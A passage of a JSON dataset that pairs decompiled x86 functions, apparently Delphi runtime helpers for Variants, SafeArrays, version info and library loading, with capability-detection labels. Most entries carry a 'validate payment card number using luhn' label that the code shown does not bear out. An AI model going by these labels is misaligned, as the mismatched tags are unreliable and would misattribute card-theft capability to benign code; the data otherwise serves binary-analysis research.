        "decompiled_code": "\nint32_t __cdecl fcn.0040dbfc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_DL = extraout_DL;\n    }\n    fcn.004054c0();\n    *(in_EAX + 8) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 146
    },
    "0040dd40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040dd40(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack56 = 0x40dddc;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    if (in_EAX == 0) {\n        fcn.004075f4();\n    }\n    else {\n        puStack52 = &stack0xfffffffc;\n        fcn.00405504();\n    }\n    var_1ch = var_4h;\n    var_18h._0_1_ = 0xb;\n    var_10h._0_1_ = 0xb;\n    var_8h._0_1_ = 0;\n    arg_ch = &var_1ch;\n    arg_8h = 2;\n    var_14h = param_2;\n    fcn.004075f4();\n    fcn.0040daac(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    uStack60 = 0x40dde3;\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 387
    },
    "0040ddfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ddfc(uint arg_8h)\n\n{\n    fcn.0040dd40();\n    fcn.0040ddec();\n    return;\n}\n",
        "token_count": 40
    },
    "0040de30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040de30(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    unkbyte3 Var3;\n    int32_t iVar2;\n    \n    iVar1 = *in_EAX;\n    Var3 = iVar1 >> 8;\n    if (iVar1 < -0x3fffff6d) {\n        iVar2 = iVar1;\n        if (iVar1 == -0x3fffff6e) {\ncode_r0x0040de94:\n            return CONCAT31(iVar2 >> 8, 6);\n        }\n        if (iVar1 < -0x3fffff71) {\n            if (iVar1 == -0x3fffff72) {\n                return CONCAT31(Var3, 7);\n            }\n            if (iVar1 == -0x3ffffffb) {\n                return 0xb;\n            }\n            if (iVar1 == -0x3fffff74) {\n                return 4;\n            }\n            iVar2 = iVar1 + 0x3fffff73;\n            if (iVar2 == 0) goto code_r0x0040de9d;\n        }\n        else {\n            iVar2 = iVar1 + 0x3fffff6f;\n            if (iVar1 + 0x3fffff71U < 2) goto code_r0x0040de94;\n            if (iVar2 == 0) {\n                return 8;\n            }\n        }\n    }\n    else if (iVar1 < -0x3fffff69) {\n        if (iVar1 == -0x3fffff6a) {\n            return CONCAT31(Var3, 0xc);\n        }\n        iVar2 = iVar1 + 0x3fffff6d;\n        if (iVar2 == 0) {\ncode_r0x0040de9d:\n            return CONCAT31(iVar2 >> 8, 9);\n        }\n        if (iVar1 == -0x3fffff6c) {\n            return 3;\n        }\n        iVar2 = iVar1 + 0x3fffff6b;\n        if (iVar2 == 0) {\n            return 5;\n        }\n    }\n    else {\n        if (iVar1 == -0x3fffff03) {\n            return 0xe;\n        }\n        iVar2 = iVar1 + 0x3ffffec6;\n        if (iVar2 == 0) {\n            return 0xd;\n        }\n    }\n    return CONCAT31(iVar2 >> 8, 0x16);\n}\n",
        "token_count": 552
    },
    "0040e094": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e094(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40e14d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_4h = in_EAX;\n    uVar2 = fcn.0040de30();\n    uVar2 = uVar2 & 0xff;\n    if (7 < uVar2 - 3) {\n        if (uVar2 == 0xb) {\n            in_stack_ffffffd4 = 0x40e0eb;\n            iVar3 = fcn.0040dec8(&stack0xfffffffc);\n            goto code_r0x0040e120;\n        }\n        if (9 < uVar2 - 0xc) {\n            var_ch = *var_4h;\n            var_8h._0_1_ = 0;\n            arg_ch = &fcn.0040e094::var_ch;\n            in_stack_ffffffd4 = 0;\n            fcn.004075f4();\n            iVar3 = fcn.0040daac(in_stack_ffffffd4, arg_ch);\n            goto code_r0x0040e120;\n        }\n    }\n    iVar3 = fcn.0040da70();\ncode_r0x0040e120:\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        *(iVar3 + 0xc) = var_4h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x40e154;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 480
    },
    "0040e318": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get file version info"
        ],
        "decompiled_code": "\nvoid fcn.0040e318(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa0;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint pBlock;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x40e3ee;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_8h = 0xffffffff;\n    puStack48 = 0x40e345;\n    fcn.00405504();\n    puStack48 = 0x40e34d;\n    fcn.00405954();\n    puStack48 = &fcn.0040e318::var_ch;\n    uStack52 = 0x40e359;\n    uStack52 = fcn.004058fc();\n    puStack56 = 0x40e35f;\n    iVar1 = sub.version.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        puStack56 = 0x40e36c;\n        pBlock = fcn.00402ef0();\n        uStack60 = 0x40e3d1;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.004058fc(var_ch, iVar1, pBlock);\n        iVar1 = sub.version.dll_GetFileVersionInfoA(uVar2);\n        if (iVar1 != 0) {\n            in_stack_ffffffa0 = pBlock;\n            iVar1 = sub.version.dll_VerQueryValueA(pBlock, 0x40e400, &fcn.0040e318::lplpBuffer, &fcn.0040e318::puLen);\n            if (iVar1 != 0) {\n                var_8h = *(lplpBuffer + 8);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        fcn.00402f0c(0x40e3d8);\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    uStack44 = 0x40e3f5;\n    puStack48 = 0x40e3ed;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 604
    },
    "0040ea20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ea20(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint var_1h;\n    \n    sub.kernel32.dll_GetCPInfo(0, arg_8h + -0x14);\n    for (iVar4 = 0; (iVar4 < 0xc && ((*(arg_8h + -0xe + iVar4) | *(arg_8h + -0xd + iVar4)) != 0)); iVar4 = iVar4 + 2) {\n        var_1h._0_1_ = *(arg_8h + -0xe + iVar4);\n        uVar1 = *(arg_8h + -0xd + iVar4);\n        if (var_1h <= uVar1) {\n            cVar3 = (uVar1 - var_1h) + '\\x01';\n            do {\n                puVar2 = (var_1h >> 3) + 0x490820;\n                *puVar2 = *puVar2 | '\\x01' << (var_1h & 7);\n                var_1h._0_1_ = var_1h + 1;\n                cVar3 = cVar3 + -1;\n            } while (cVar3 != '\\0');\n        }\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "0040f1a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f1a8(void)\n\n{\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    fcn.0040555c();\n    return;\n}\n",
        "token_count": 39
    },
    "0040f1ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f1ec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x40f277;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == 0) {\n        iVar1 = fcn.0040db2c();\n    }\n    else {\n        var_ch._0_1_ = 0;\n        puStack32 = &stack0xfffffffc;\n        fcn.0040d25c();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        in_stack_ffffffd0 = 1;\n        iVar1 = fcn.0040db68(1, &var_10h);\n    }\n    *(iVar1 + 0xc) = in_EAX;\n    fcn.00404eb4();\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x40f27e;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 332
    },
    "0040f5e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040f5e4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 0xc) = 0xffff;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0xffffffff, 0);\n    *(in_EAX + 0x10) = uVar1;\n    uVar2 = 0;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n    *(in_EAX + 0x14) = uVar1;\n    *(in_EAX + 0x18) = 0xffffffff;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x20) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 289
    },
    "0040f984": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f984(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x40f993;\n    uStack24 = param_2;\n    sub.kernel32.dll_SetErrorMode();\n    uStack32 = 0x40f9f6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x40f9d8;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_LoadLibraryA();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 252
    },
    "00410db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00410db0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x410dfa;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    fcn.004075f4();\n    fcn.0040da70();\n    fcn.00404eb4();\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x410e01;\n    uStack16 = 0x410df9;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 173
    },
    "00410e04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410e04(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410e93;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415cc8();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415cc8();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.004075f4();\n    fcn.0040daac(arg_8h, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410e9a;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 306
    },
    "00410ef4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410ef4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410f83;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415cc8();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415cc8();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.004075f4();\n    fcn.0040daac(arg_8h, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410f8a;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 306
    },
    "00411364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411364(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "00411394": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411394(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.00411394(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "004113f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004113f0(void)\n\n{\n    char cVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint plLbound;\n    uint ppvData;\n    uint var_310h;\n    int32_t plUbound;\n    uint16_t *psa;\n    uint pvarg;\n    uint var_300h;\n    uint var_2fch;\n    uint rgIndices;\n    \n    if ((*(in_EAX + 1) & 0x20) == 0) {\n        fcn.00411238();\n    }\n    if ((*in_EAX & 0xfff) == 0xc) {\n        if ((*in_EAX & 0x4000) == 0) {\n            psa = *(in_EAX + 4);\n        }\n        else {\n            psa = **(in_EAX + 4);\n        }\n        uVar2 = *psa;\n        if (-1 < uVar2 - 1) {\n            iVar7 = 0;\n            piVar6 = &var_300h;\n            uVar5 = uVar2;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar7 + 1, piVar6 + 1);\n                fcn.00411238();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.00411238();\n                *piVar6 = (plUbound - piVar6[1]) + 1;\n                iVar7 = iVar7 + 1;\n                piVar6 = piVar6 + 2;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (-1 < uVar2 - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.00411364(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex();\n                fcn.00411238();\n                fcn.004115e8();\n            }\n            cVar1 = fcn.00411394(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    sub.oleaut32.dll_VariantClear(in_EAX);\n    fcn.00411238();\n    return;\n}\n",
        "token_count": 629
    },
    "00411708": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411708(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "00411738": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411738(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.00411738(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "00411794": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411794(code *param_1, uint16_t *param_2)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint plLbound;\n    uint var_31ch;\n    uint ppvData;\n    uint16_t *psa;\n    uint32_t cDims;\n    int32_t plUbound;\n    code *var_308h;\n    ushort *pvargDest;\n    uint rgsabound;\n    uint var_2fch;\n    uint rgIndices;\n    \n    var_308h = param_1;\n    pvargDest = in_EAX;\n    if ((*(param_2 + 1) & 0x20) == 0) {\n        fcn.00411238();\n    }\n    if ((*param_2 & 0xfff) == 0xc) {\n        if ((*param_2 & 0x4000) == 0) {\n            psa = *(param_2 + 4);\n        }\n        else {\n            psa = **(param_2 + 4);\n        }\n        uVar2 = *psa;\n        cDims = uVar2;\n        if (-1 < uVar2 - 1) {\n            iVar6 = 0;\n            piVar5 = &rgsabound;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar6 + 1, piVar5 + 1);\n                fcn.00411238();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.00411238();\n                *piVar5 = (plUbound - piVar5[1]) + 1;\n                iVar6 = iVar6 + 1;\n                piVar5 = piVar5 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        iVar6 = sub.oleaut32.dll_SafeArrayCreate(0xc, cDims, &rgsabound);\n        if (iVar6 == 0) {\n            fcn.00410f90();\n        }\n        fcn.004115e8();\n        *pvargDest = 0x200c;\n        *(pvargDest + 4) = iVar6;\n        if (-1 < cDims - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            uVar2 = cDims;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.00411708(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData);\n                fcn.00411238();\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(iVar6, &rgIndices, &var_31ch);\n                fcn.00411238();\n                (*var_308h)();\n            }\n            cVar1 = fcn.00411738(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    else {\n        sub.oleaut32.dll_VariantCopy(pvargDest, param_2);\n        fcn.00411238();\n    }\n    return;\n}\n",
        "token_count": 809
    },
    "00411a58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411a58(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    \n    puStack36 = &fcn.00411a58::pvarg;\n    puStack40 = 0x411a70;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x411ab4;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    fcn.00411ce0();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x411abb;\n    uStack44 = 0x411ab3;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 207
    },
    "00411fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00411fc0(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x4929e8)(&puStack24);\n    fcn.00411244();\n    return 0x400;\n}\n",
        "token_count": 79
    },
    "00411ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411ffc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_4h;\n    \n    puStack32 = &fcn.00411ffc::pvarg;\n    puStack36 = 0x41200e;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x412050;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    var_4h = fcn.004120a4();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x412057;\n    uStack40 = 0x41204f;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 216
    },
    "00412060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412060(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    \n    uVar1 = fcn.00416124();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(3);\n        *param_2 = iStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "00412abc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412abc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &fcn.00412abc::pvarg;\n    puStack40 = 0x412ace;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x412b13;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    _var_8h = fcn.00412b74();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x412b1a;\n    uStack44 = 0x412b12;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 236
    },
    "00412b28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412b28(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416124();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(0x14);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 145
    },
    "004130bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004130bc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_1h;\n    \n    puStack32 = &fcn.004130bc::pvarg;\n    puStack36 = 0x4130ce;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x413110;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.004130bc::var_1h + 1;\n    fcn.00411a14();\n    (**0x497984)();\n    var_1h._0_1_ = fcn.0041316c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x413117;\n    uStack40 = 0x41310f;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 256
    },
    "004134c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
